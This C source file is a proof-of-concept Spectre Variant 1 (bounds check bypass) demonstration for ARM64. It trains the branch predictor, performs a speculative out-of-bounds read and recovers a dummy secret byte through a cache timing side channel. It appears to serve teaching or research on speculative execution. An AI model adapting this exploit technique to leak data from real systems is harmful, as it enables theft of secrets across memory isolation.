#include "utils_arm64.c"
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

// --- Spectre Variant 1 (Bounds Check Bypass) ---
// ARM64-compatible version using stack-allocated (local) variables
// Compile with: gcc -O0 spectre_1_arm64_stack.c -o spectre_1_arm64_stack

// The vulnerable function: operates on local arrays passed as arguments
__attribute__((noinline)) void speculative_read_v1_local(uint8_t *array, size_t array_size, uint8_t *probe_array, size_t index)
{
    // Architectural check: if index is out-of-bounds, this branch prevents the access.
    if (index < array_size)
    {
        // This is the "safe" path. The speculatively executed path will use a larger 'index'.
        volatile uint8_t value = array[index];
        // Use the value to access the probe array, creating a cache side-channel.
        probe_array[value * CACHE_LINE_SIZE] = 1; // Dummy write
    }
}

int main_spectre_v1_stack()
{
    // Stack-allocated arrays and variables
    uint8_t public_array[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
    uint8_t secret_data_v1 = 'S'; // The secret byte we want to leak
    size_t array_size = sizeof(public_array);
    uint8_t probe_array[256 * CACHE_LINE_SIZE] = {0};

    common_init();
    printf("\n--- Running Spectre Variant 1 (Stack, Bounds Check Bypass) Demo ---\n");

    // --- Training Phase ---
    printf("Training branch predictor...\n");
    for (int i = 0; i < 1000; i++)
    {
        speculative_read_v1_local(public_array, array_size, probe_array, i % array_size);
    }
    _mm_mfence();

    // --- Attack Phase ---
    flush_probe_array();
    _mm_mfence();

    // Calculate the "out-of-bounds" index to read 'secret_data_v1'.
    // Assume secret_data_v1 is located immediately after public_array for simplicity.
    size_t attacker_controlled_oob_index = (size_t)((uintptr_t)&secret_data_v1 - (uintptr_t)public_array);

    printf("Attempting to leak secret data from OOB index %zu...\n", attacker_controlled_oob_index);

    // Call the vulnerable function with the attacker-controlled index.
    speculative_read_v1_local(public_array, array_size, probe_array, attacker_controlled_oob_index);

    _mm_mfence();

    // --- Measurement Phase ---
    perform_measurement(secret_data_v1, "Spectre V1 secret");

    printf("Actual secret data: %c\n", secret_data_v1);
    return 0;
}

int main()
{
    return main_spectre_v1_stack();
}